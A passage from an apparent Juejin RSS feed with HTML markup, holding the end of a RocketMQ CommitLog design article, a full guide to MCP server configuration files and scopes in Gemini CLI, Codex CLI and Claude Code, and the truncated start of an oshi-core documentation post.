<p><strong>任务调度系统（JobFlow）：</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">任务执行记录：
<span class="hljs-bullet">1.</span> 任务执行日志（顺序写）
<span class="hljs-bullet">2.</span> 任务状态索引（异步构建）
<span class="hljs-bullet">3.</span> 查询走索引，不扫描日志
</code></pre>
<p><strong>审计日志系统：</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">操作日志：
<span class="hljs-bullet">1.</span> 所有操作追加到日志文件
<span class="hljs-bullet">2.</span> 按时间、用户、操作类型建索引
<span class="hljs-bullet">3.</span> 查询走索引
</code></pre>
<p><strong>事件溯源（Event Sourcing）：</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">事件存储：
<span class="hljs-bullet">1.</span> 所有事件顺序追加
<span class="hljs-bullet">2.</span> 聚合根状态异步计算
<span class="hljs-bullet">3.</span> 查询走状态快照
</code></pre>
<h3 data-id="heading-37">7.4 适用场景</h3>
<p>WAL模式适合：</p>
<ul>
<li>写多读少的场景</li>
<li>对写入性能要求高</li>
<li>需要保证数据不丢</li>
<li>可以容忍读取稍慢（通过索引优化）</li>
</ul>
<p>不适合：</p>
<ul>
<li>需要频繁随机读取</li>
<li>磁盘空间紧张</li>
<li>实时查询要求高</li>
</ul>
<h2 data-id="heading-38">总结</h2>
<p>RocketMQ的CommitLog设计看起来简单，实则精妙。</p>
<p>设计核心：</p>
<ul>
<li>所有Topic共用一个CommitLog</li>
<li>顺序追加写入</li>
<li>mmap零拷贝 + PageCache</li>
</ul>
<p>性能真相：</p>
<ul>
<li>单纯顺序写：500-1000 TPS（每条都刷盘）</li>
<li>加上mmap：50,000-100,000 TPS（不刷盘，不实用）</li>
<li>完整优化：100,000-200,000 TPS（多线程+批量+参数优化+硬件）</li>
</ul>
<p>要达到生产级性能，需要：</p>
<ol>
<li>多线程模型（网络、业务、刷盘、索引分离）</li>
<li>批量处理（批量发送、批量编码、批量刷盘）</li>
<li>内核参数优化（TCP、虚拟内存、IO调度器）</li>
<li>JVM优化（G1GC、直接内存）</li>
<li>RocketMQ配置优化（异步刷盘、文件预热、堆外内存池）</li>
<li>硬件配置（NVMe SSD、大内存、万兆网卡）</li>
</ol>
<p>设计权衡：</p>
<ul>
<li>HDD：顺序写比随机写快50-800倍</li>
<li>SSD：顺序写比随机写快5-30倍（多文件场景）</li>
<li>牺牲读取的直接性（用ConsumeQueue索引解决）</li>
<li>牺牲空间效率（用定期清理解决）</li>
<li>牺牲单点扩展（用Broker集群解决）</li>
<li>换来写入的极致性能</li>
</ul>
<p>通用思想：</p>
<ul>
<li>WAL模式是高性能持久化的经典方案</li>
<li>顺序IO是存储系统的黄金法则</li>
<li>读写分离让各自性能达到极致</li>
<li>性能不是免费的，需要系统性优化</li>
</ul>
<p>顺序写的威力，不是快一点，而是快了几个数量级。但要达到这个威力，需要的不只是顺序写，而是整套优化组合拳。</p>
<p>这就是CommitLog设计的精髓。它不仅是RocketMQ的存储基石，更是一种可以广泛应用的设计思想。</p>
<p>下一篇，我们会深入ConsumeQueue的异步构建机制，看看RocketMQ如何在保证写入性能的同时，让消费者高效读取消息。</p>
<hr/>
<p><strong>参考资料：</strong></p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Frocketmq.apache.org%2F" target="_blank" title="https://rocketmq.apache.org/" ref="nofollow noopener noreferrer">RocketMQ 官方文档</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fapache%2Frocketmq%2Fblob%2Fmaster%2Fdocs%2Fcn%2Fdesign.md" target="_blank" title="https://github.com/apache/rocketmq/blob/master/docs/cn/design.md" ref="nofollow noopener noreferrer">RocketMQ Design</a></li>
<li>《RocketMQ技术内幕》第三章 - 消息存储</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[开发者必看：三大 CLI 工具 MCP 配置详解]]></title>    <link>https://juejin.cn/post/7590593682584502335</link>    <guid>https://juejin.cn/post/7590593682584502335</guid>    <pubDate>2026-01-02T06:35:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590593682584502335" data-draft-id="7589940210831196203" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="开发者必看：三大 CLI 工具 MCP 配置详解"/> <meta itemprop="keywords" content="JavaScript"/> <meta itemprop="datePublished" content="2026-01-02T06:35:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="火车叼位"/> <meta itemprop="url" content="https://juejin.cn/user/1345457960792808"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            开发者必看：三大 CLI 工具 MCP 配置详解
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1345457960792808/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    火车叼位
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T06:35:54.000Z" title="Fri Jan 02 2026 06:35:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>以下是三家 CLI 工具的 MCP 配置核心差异概述，后续章节将详细介绍每个工具的具体配置方式：</p>
<ul>
<li><strong>Gemini CLI</strong>：使用 <code>.gemini/settings.json</code>（项目级）和 <code>~/.gemini/settings.json</code>（用户级），通过 <code>mcpServers</code> 与 <code>mcp</code> 统一管理</li>
<li><strong>Codex CLI</strong>：使用 <code>.codex/config.toml</code>（项目级，逐层加载）和 <code>~/.codex/config.toml</code>（用户级）</li>
<li><strong>Claude Code</strong>：使用 <code>.mcp.json</code>（项目级）和 <code>~/.claude.json</code>（用户级），支持 local/project/user 三个作用域</li>
</ul>
<h2 data-id="heading-0">Gemini CLI（google/gemini-cli）</h2>
<h3 data-id="heading-1">配置位置</h3>
<ul>
<li><strong>项目级</strong>：<code>.gemini/settings.json</code></li>
<li><strong>用户级</strong>：<code>~/.gemini/settings.json</code></li>
</ul>
<h3 data-id="heading-2">常用命令</h3>
<pre><code class="hljs language-bash" lang="bash">gemini mcp add/list/remove <span class="hljs-comment"># 默认 project 作用域</span>
gemini mcp add &lt;server&gt; -s/--scope user <span class="hljs-comment"># 指定 user 作用域</span>
</code></pre>
<h3 data-id="heading-3">配置结构示例</h3>
<h3 data-id="heading-4">项目级配置（.gemini/settings.json）</h3>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"mcpServers"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"team-server"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"http"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"url"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"https://mcp.example.com"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"headers"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"Authorization"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Bearer {{TOKEN}}"</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"mcp"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"allow"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"*.example.com"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"exclude"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"node_modules/**"</span><span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-5">用户级配置（~/.gemini/settings.json）</h3>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"mcpServers"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"personal-server"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"stdio"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"command"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"npx"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"args"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"mcp-server"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"--port"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"3000"</span><span class="hljs-punctuation">]</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-6">作用域与优先级</h3>
<ul>
<li>通过 <code>settings.json</code> 的 <code>mcpServers</code> 与 <code>mcp</code> 统一管理</li>
<li><code>gemini mcp add</code> 支持 <code>-s/--scope</code> 参数，默认值为 <code>project</code></li>
<li>项目级配置会覆盖用户级同名配置</li>
</ul>
<h2 data-id="heading-7">Codex CLI（openai/codex）</h2>
<h3 data-id="heading-8">配置位置与加载层级</h3>
<p>Codex 使用 <code>config.toml</code> 文件，并按以下顺序层叠加载（优先级从高到低）：</p>
<ol>
<li><strong>运行时配置</strong>：通过 <code>--config</code> 等参数临时覆盖</li>
<li><strong>项目层配置</strong>：从当前目录向上查找 <code>.codex/config.toml</code>，越接近当前目录优先级越高</li>
<li><strong>用户层配置</strong>：<code>$CODEX_HOME/config.toml</code>（默认 <code>~/.codex/config.toml</code>）</li>
</ol>
<h3 data-id="heading-9">项目根目录识别</h3>
<p>Codex 会基于 <strong>项目根</strong> 来确定搜索边界，默认以 <code>.git</code> 作为项目根标记。可在配置中改写 <code>project_root_markers</code>：</p>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-attr">project_root_markers</span> = [<span class="hljs-string">".git"</span>, <span class="hljs-string">".codex-root"</span>, <span class="hljs-string">"package.json"</span>]
</code></pre>
<h3 data-id="heading-10">常用命令</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 主要通过编辑 config.toml 文件</span>
<span class="hljs-comment"># OAuth 登录命令</span>
codex mcp login &lt;name&gt;
</code></pre>
<h3 data-id="heading-11">配置结构示例</h3>
<h3 data-id="heading-12">项目级配置（.codex/config.toml）</h3>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-section">[mcp_servers.team-shared]</span>
<span class="hljs-attr">command</span> = <span class="hljs-string">"npx"</span>
<span class="hljs-attr">args</span> = [<span class="hljs-string">"-y"</span>, <span class="hljs-string">"mcp-server"</span>, <span class="hljs-string">"--env"</span>, <span class="hljs-string">"production"</span>]

<span class="hljs-section">[mcp_servers.http-server]</span>
<span class="hljs-attr">url</span> = <span class="hljs-string">"https://api.example.com/mcp"</span>
<span class="hljs-attr">bearer_token_env_var</span> = <span class="hljs-string">"MCP_TOKEN"</span>
</code></pre>
<h3 data-id="heading-13">用户级配置（~/.codex/config.toml）</h3>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-section">[mcp_servers.personal-test]</span>
<span class="hljs-attr">command</span> = <span class="hljs-string">"python"</span>
<span class="hljs-attr">args</span> = [<span class="hljs-string">"-m"</span>, <span class="hljs-string">"mcp_server"</span>, <span class="hljs-string">"--debug"</span>]

<span class="hljs-comment"># 全局 MCP 设置</span>
<span class="hljs-section">[mcp]</span>
<span class="hljs-attr">default_server</span> = <span class="hljs-string">"team-shared"</span>
</code></pre>
<h3 data-id="heading-14">作用域与优先级</h3>
<ul>
<li>配置按层叠顺序加载，越接近当前目录优先级越高</li>
<li>运行时配置 &gt; 项目层配置 &gt; 用户层配置</li>
<li>项目根目录默认以 <code>.git</code> 为界</li>
</ul>
<h2 data-id="heading-15">Claude Code（claude-code）</h2>
<h3 data-id="heading-16">配置位置</h3>
<ul>
<li><strong>项目级</strong>：<code>.mcp.json</code>（建议纳入版本控制，团队共享）</li>
<li><strong>用户级</strong>：<code>~/.claude.json</code>（跨项目共享）</li>
</ul>
<h3 data-id="heading-17">常用命令</h3>
<pre><code class="hljs language-bash" lang="bash">claude mcp add &lt;server&gt; --scope project <span class="hljs-comment"># 项目级配置</span>
claude mcp add &lt;server&gt; --scope user    <span class="hljs-comment"># 用户级配置</span>
claude mcp list --scope all             <span class="hljs-comment"># 查看所有配置</span>
claude mcp remove &lt;server&gt; --scope <span class="hljs-built_in">local</span> <span class="hljs-comment"># 移除本地配置</span>
</code></pre>
<h3 data-id="heading-18">配置结构示例</h3>
<h3 data-id="heading-19">项目级配置（.mcp.json）</h3>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"servers"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"team-mcp"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"http"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"url"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"https://mcp.team.example.com"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"headers"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"X-Team"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"engineering"</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"default"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"team-mcp"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-20">用户级配置（~/.claude.json）</h3>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"mcp"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"servers"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"personal-local"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"stdio"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"command"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"npx"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"args"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"mcp-server"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"--port"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"4000"</span><span class="hljs-punctuation">]</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"local"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"current-project-id"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"servers"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
          <span class="hljs-attr">"local-override"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
            <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"http"</span><span class="hljs-punctuation">,</span>
            <span class="hljs-attr">"url"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"http://localhost:3000"</span>
          <span class="hljs-punctuation">}</span>
        <span class="hljs-punctuation">}</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-21">作用域与优先级</h3>
<ul>
<li><strong>优先级顺序</strong>：local &gt; project &gt; user</li>
<li><strong>local 作用域</strong>：存储在 <code>~/.claude.json</code> 中，但仅对当前项目生效</li>
<li><strong>项目级配置</strong>：通过 <code>.mcp.json</code> 文件共享，适合团队协作</li>
<li><strong>用户级配置</strong>：跨项目共享，适合个人偏好设置</li>
</ul>
<h2 data-id="heading-22">选择建议（按场景）</h2>
<h3 data-id="heading-23">团队协作场景</h3>
<ul>
<li><strong>优先使用项目级配置</strong>：把 MCP 服务器、权限、默认命令固定下来</li>
<li>将配置文件纳入版本控制，确保团队成员使用一致的设置</li>
<li>避免在项目级配置中存储敏感信息，可使用环境变量替代</li>
</ul>
<h3 data-id="heading-24">个人习惯场景</h3>
<ul>
<li><strong>使用用户级配置</strong>：承载个人路径、密钥与实验性配置</li>
<li>适合不同项目需要的个性化设置</li>
</ul>
<h3 data-id="heading-25">配置覆盖场景</h3>
<ul>
<li><strong>使用 local 作用域</strong>：在不修改团队配置的情况下，针对特定项目进行最小化覆盖</li>
<li>适合临时测试或本地开发需求</li>
</ul>
<h2 data-id="heading-26">参考链接</h2>
<ul>
<li>Gemini CLI MCP 文档：<code>https://github.com/google-gemini/gemini-cli/blob/main/docs/tools/mcp-server.md</code></li>
<li>Codex 配置文档：<code>https://raw.githubusercontent.com/openai/codex/main/docs/config.md</code></li>
<li>Codex 配置加载逻辑（项目层级）：<code>https://raw.githubusercontent.com/openai/codex/main/codex-rs/core/src/config_loader/mod.rs</code></li>
<li>Claude Code MCP 文档：<code>https://code.claude.com/docs/en/mcp</code></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[com.github.oshi : oshi-core 中文文档（中英对照·API·接口·操作手册·全版本）以6.4.0为例，含Maven依赖、jar包、源码]]></title>    <link>https://juejin.cn/post/7590104561475174452</link>    <guid>https://juejin.cn/post/7590104561475174452</guid>    <pubDate>2026-01-02T06:16:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590104561475174452" data-draft-id="7590054976489291816" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="com.github.oshi : oshi-core 中文文档（中英对照·API·接口·操作手册·全版本）以6.4.0为例，含Maven依赖、jar包、源码"/> <meta itemprop="keywords" content="后端,Java"/> <meta itemprop="datePublished" content="2026-01-02T06:16:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="寒水馨"/> <meta itemprop="url" content="https://juejin.cn/user/2840793777967512"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            com.github.oshi : oshi-core 中文文档（中英对照·API·接口·操作手册·全版本）以6.4.0为例，含Maven依赖、jar包、源码
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2840793777967512/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    寒水馨
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T06:16:45.000Z" title="Fri Jan 02 2026 06:16:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li 